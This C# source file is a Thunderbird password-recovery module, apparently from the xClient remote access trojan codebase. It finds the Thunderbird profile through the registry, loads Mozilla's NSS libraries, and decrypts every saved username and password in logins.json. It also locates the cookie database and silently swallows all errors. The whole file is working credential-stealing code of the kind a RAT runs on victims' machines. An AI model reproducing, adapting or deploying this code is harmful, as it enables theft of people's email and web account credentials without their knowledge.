using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;
using xClient.Core.Data;
using xClient.Core.Extensions;
using xClient.Core.Helper;
using xClient.Core.Recovery.Utilities;
using xClient.Core.Utilities;

namespace xClient.Core.Recovery.Other
{
    /// <summary>
    /// A small class to recover thunderbird Data
    /// </summary>
    public static class Thunderbird
    {
        private static IntPtr _nssModule;

        private static IntPtr _dll1;
        private static IntPtr _dll2;
        private static IntPtr _dll3;
        private static IntPtr _dll4;
        private static IntPtr _dll5;
        private static long _keySlot;

        private static DirectoryInfo thunderbirdPath;
        private static DirectoryInfo thunderbirdProfilePath;

        private static FileInfo thunderbirdLoginFile;
        private static FileInfo thunderbirdCookieFile;

        static Thunderbird()
        {
            try
            {
                thunderbirdPath = GetthunderbirdInstallPath();
                if (thunderbirdPath == null)
                    throw new NullReferenceException("thunderbird is not installed, or the install path could not be located");

                thunderbirdProfilePath = GetProfilePath();
                if (thunderbirdProfilePath == null)
                    throw new NullReferenceException("thunderbird does not have any profiles, has it ever been launched?");

                thunderbirdLoginFile = GetFile(thunderbirdProfilePath, "logins.json");
                if (thunderbirdLoginFile == null)
                    throw new NullReferenceException("thunderbird does not have any logins.json file");

                thunderbirdCookieFile = GetFile(thunderbirdProfilePath, "cookies.sqlite");
                if (thunderbirdCookieFile == null)
                    throw new NullReferenceException("thunderbird does not have any cookie file");
            }
            catch (Exception)
            {

            }
        }

        #region Public Members
        /// <summary>
        /// Recover thunderbird Passwords from logins.json
        /// </summary>
        /// <returns>List of Username/Password/Host</returns>
        public static List<RecoveredAccount> GetSavedPasswords()
        {
            List<RecoveredAccount> thunderbirdPasswords = new List<RecoveredAccount>();
            try
            {
                // init libs
                InitializeDelegates(thunderbirdProfilePath, thunderbirdPath);

                JsonFFData ffLoginData = new JsonFFData();

                using (StreamReader sr = new StreamReader(thunderbirdLoginFile.FullName))
                {
                    string json = sr.ReadToEnd();
                    ffLoginData = JsonUtil.Deserialize<JsonFFData>(json);
                }

                foreach (Login data in ffLoginData.logins)
                {
                    string username = Decrypt(data.encryptedUsername);
                    string password = Decrypt(data.encryptedPassword);
                    string host = data.hostname;

                    thunderbirdPasswords.Add(new RecoveredAccount() { URL = host, Username = username, Password = password, Application = "Thunderbird" });
                }
            }
            catch (Exception e)
            {
            }

            PK11_FreeSlot(_keySlot);
            NSS_Shutdown();

            if (_dll1 != IntPtr.Zero)
                FreeLibrary(_dll1);
            if (_dll2 != IntPtr.Zero)
                FreeLibrary(_dll2);
            if (_dll3 != IntPtr.Zero)
                FreeLibrary(_dll3);
            if (_dll4 != IntPtr.Zero)
                FreeLibrary(_dll4);
            if (_dll5 != IntPtr.Zero)
                FreeLibrary(_dll5);

            if (_nssModule != IntPtr.Zero)
                FreeLibrary(_nssModule);

            return thunderbirdPasswords;
        }

   
        #endregion

        #region Functions

        private static void InitializeDelegates(DirectoryInfo thunderbirdProfilePath, DirectoryInfo thunderbirdPath)
        {
            //Return if under thunderbird 35 (35+ supported)
            //thunderbird changes their DLL heirarchy/code with different releases
            //So we need to avoid trying to load a DLL in the wrong order
            //To prevent pop up saying it could not load the DLL
            if (new Version(FileVersionInfo.GetVersionInfo(thunderbirdPath.FullName + "\\thunderbird.exe").FileVersion).Major < new Version("35.0.0").Major)
                 return;

            _dll1 = NativeMethods.LoadLibrary(thunderbirdPath.FullName + "\\msvcr100.dll");
            _dll2 = NativeMethods.LoadLibrary(thunderbirdPath.FullName + "\\msvcp100.dll");
            _dll3 = NativeMethods.LoadLibrary(thunderbirdPath.FullName + "\\msvcr120.dll");
            _dll4 = NativeMethods.LoadLibrary(thunderbirdPath.FullName + "\\msvcp120.dll");
            _dll5 = NativeMethods.LoadLibrary(thunderbirdPath.FullName + "\\mozglue.dll");
            _nssModule = NativeMethods.LoadLibrary(thunderbirdPath.FullName + "\\nss3.dll");

            IntPtr pProc = NativeMethods.GetProcAddress(_nssModule, "NSS_Init");
            NSS_InitPtr NSS_Init = (NSS_InitPtr) Marshal.GetDelegateForFunctionPointer(pProc, typeof(NSS_InitPtr));
            NSS_Init(thunderbirdProfilePath.FullName);
            _keySlot = PK11_GetInternalKeySlot();
            PK11_Authenticate(_keySlot, true, 0);
        }

        private static DateTime FromUnixTime(long unixTime)
        {
            DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
            return epoch.AddSeconds(unixTime);
        }
        private static long ToUnixTime(DateTime value)
        {
            TimeSpan span = (value - new DateTime(1970, 1, 1, 0, 0, 0, 0).ToLocalTime());
            return (long)span.TotalSeconds;
        }
        #endregion

        #region File Handling
        private static DirectoryInfo GetProfilePath()
        {
            string raw = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Thunderbird\Profiles";
            if (!Directory.Exists(raw))
                throw new Exception("thunderbird Application Data folder does not exist!");
            DirectoryInfo profileDir = new DirectoryInfo(raw);

            DirectoryInfo[] profiles = profileDir.GetDirectories();
            if (profiles.Length == 0)
                throw new IndexOutOfRangeException("No thunderbird profiles could be found");

            // return first profile
            return profiles[0];
        }
        private static FileInfo GetFile(DirectoryInfo profilePath, string searchTerm)
        {
            foreach (FileInfo file in profilePath.GetFiles(searchTerm))
            {
                return file;
            }
            throw new Exception("No thunderbird logins.json was found");
        }
        private static DirectoryInfo GetthunderbirdInstallPath()
        {
            // get thunderbird path from registry
            using (RegistryKey key = PlatformHelper.Is64Bit ?
                RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine,
                    @"SOFTWARE\Wow6432Node\Mozilla\Mozilla Thunderbird") :
                RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine,
                    @"SOFTWARE\Mozilla\Mozilla Thunderbird"))
            {
                if (key == null) return null;

                string[] installedVersions = key.GetSubKeyNames();

                // we'll take the first installed version, people normally only have one
                if (installedVersions.Length == 0)
                    throw new IndexOutOfRangeException("No installs of thunderbird recorded in its key.");

                using (RegistryKey mainInstall = key.OpenSubKey(installedVersions[0]))
                {
                    // get install directory
                    string installPath = mainInstall.OpenReadonlySubKeySafe("Main")
                        .GetValueSafe("Install Directory");

                    if (string.IsNullOrEmpty(installPath))
                        throw new NullReferenceException("Install string was null or empty");

                    thunderbirdPath = new DirectoryInfo(installPath);
                }
            }
            return thunderbirdPath;
        }
        #endregion

        #region WinApi

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool FreeLibrary(IntPtr hModule);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int PK11_FreeSlotPtr(long keySlot);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long NSS_InitPtr(string configdir);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int PK11SDR_DecryptPtr(ref TSECItem data, ref TSECItem result, int cx);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long PK11_GetInternalKeySlotPtr();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long PK11_AuthenticatePtr(long slot, bool loadCerts, long wincx);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int NSSBase64_DecodeBufferPtr(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int NSS_ShutdownPtr();

        [StructLayout(LayoutKind.Sequential)]
        private struct TSECItem
        {
            public int SECItemType;
            public int SECItemData;
            public int SECItemLen;
        }

        #endregion

        #region JSON
        // json deserialize classes
        /* private class JsonFFData
         {

             public long nextId;
             public LoginData[] logins;
             public string[] disabledHosts;
             public int version;

         }
         private class LoginData
         {

             public long id;
             public string hostname;
             public string url;
             public string httprealm;
             public string formSubmitURL;
             public string usernameField;
             public string passwordField;
             public string encryptedUsername;
             public string encryptedPassword;
             public string guid;
             public int encType;
             public long timeCreated;
             public long timeLastUsed;
             public long timePasswordChanged;
             public long timesUsed;

         }*/
        public class Login
        {
            public int id { get; set; }
            public string hostname { get; set; }
            public object httpRealm { get; set; }
            public string formSubmitURL { get; set; }
            public string usernameField { get; set; }
            public string passwordField { get; set; }
            public string encryptedUsername { get; set; }
            public string encryptedPassword { get; set; }
            public string guid { get; set; }
            public int encType { get; set; }
            public long timeCreated { get; set; }
            public long timeLastUsed { get; set; }
            public long timePasswordChanged { get; set; }
            public int timesUsed { get; set; }
        }

        public class JsonFFData
        {
            public int nextId { get; set; }
            public List<Login> logins { get; set; }
            public List<object> disabledHosts { get; set; }
            public int version { get; set; }
        }
        #endregion

        #region Delegate Handling
        private static int NSS_Shutdown()
        {
            IntPtr pProc = NativeMethods.GetProcAddress(_nssModule, "NSS_Shutdown");
            NSS_ShutdownPtr ptr = (NSS_ShutdownPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(NSS_ShutdownPtr));
            return ptr();
        }

        // Credit: http://www.codeforge.com/article/249225
        private static long PK11_GetInternalKeySlot()
        {
            IntPtr pProc = NativeMethods.GetProcAddress(_nssModule, "PK11_GetInternalKeySlot");
            PK11_GetInternalKeySlotPtr ptr = (PK11_GetInternalKeySlotPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11_GetInternalKeySlotPtr));
            return ptr();
        }
        private static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
        {
            IntPtr pProc = NativeMethods.GetProcAddress(_nssModule, "PK11_Authenticate");
            PK11_AuthenticatePtr ptr = (PK11_AuthenticatePtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11_AuthenticatePtr));
            return ptr(slot, loadCerts, wincx);
        }
        private static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
        {
            IntPtr pProc = NativeMethods.GetProcAddress(_nssModule, "NSSBase64_DecodeBuffer");
            NSSBase64_DecodeBufferPtr ptr = (NSSBase64_DecodeBufferPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(NSSBase64_DecodeBufferPtr));
            return ptr(arenaOpt, outItemOpt, inStr, inLen);
        }
        private static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
        {
            IntPtr pProc = NativeMethods.GetProcAddress(_nssModule, "PK11SDR_Decrypt");
            PK11SDR_DecryptPtr ptr = (PK11SDR_DecryptPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11SDR_DecryptPtr));
            return ptr(ref data, ref result, cx);
        }
        private static int PK11_FreeSlot(long keySlot)
        {
            IntPtr pProc = NativeMethods.GetProcAddress(_nssModule, "PK11_FreeSlot");
            PK11_FreeSlotPtr ptr = (PK11_FreeSlotPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(PK11_FreeSlotPtr));
            return ptr(keySlot);
        }

        private static string Decrypt(string cypherText)
        {
            StringBuilder sb = new StringBuilder(cypherText);
            int hi2 = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, sb, sb.Length);
            TSECItem tSecDec = new TSECItem();
            TSECItem item = (TSECItem)Marshal.PtrToStructure(new IntPtr(hi2), typeof(TSECItem));
            if ((PK11SDR_Decrypt(ref item, ref tSecDec, 0)) == 0)
            {
                if (tSecDec.SECItemLen != 0)
                {
                    byte[] bvRet = new byte[tSecDec.SECItemLen];
                    Marshal.Copy(new IntPtr(tSecDec.SECItemData), bvRet, 0, tSecDec.SECItemLen);
                    return Encoding.UTF8.GetString(bvRet);
                }
            }
            return null;
        }
        #endregion
    }
}
